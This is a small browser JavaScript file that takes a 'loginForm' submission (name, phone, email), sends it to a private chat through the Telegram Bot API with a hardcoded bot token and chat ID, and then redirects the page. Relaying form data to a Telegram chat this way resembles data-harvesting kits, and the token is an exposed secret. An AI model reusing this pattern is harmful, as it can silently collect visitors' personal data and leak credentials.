// Telegram Bot API token
const TELEGRAM_BOT_TOKEN = "7167739580:AAEyo62W9zghyPQCKVGkNn1nF0BcggEuYV4";

// Telegram chat ID (where you want to receive messages)
const TELEGRAM_CHAT_ID = "5908974662";

document
  .getElementById("loginForm")
  .addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent the form from submitting normally

    // Get form values
    var name = document.getElementById("name").value;
    var number = document.getElementById("number").value;
    var email = document.getElementById("email").value;

    // Construct message
    var message = "Name: " + name + "\n";
    message += "Phone Number: " + number + "\n";
    message += "Email: " + email + "\n";

    // Send message to Telegram
    sendMessageToTelegram(message);

    // Clear the form fields (optional)
    document.getElementById("name").value = "";
    document.getElementById("number").value = "";
    document.getElementById("email").value = "";

    // Optionally, you can show a success message to the user
    alert("Hi " + name + "in blue ocean web ");

    window.location.href = "./index1.html";
  });

function sendMessageToTelegram(message) {
  // URL for sending messages via Telegram Bot API
  const TELEGRAM_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

  fetch(TELEGRAM_API_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    }),
  })
    .then((response) => response.json())
    .then((data) => console.log(data))
    .catch((error) => console.error("Error sending message:", error));
}
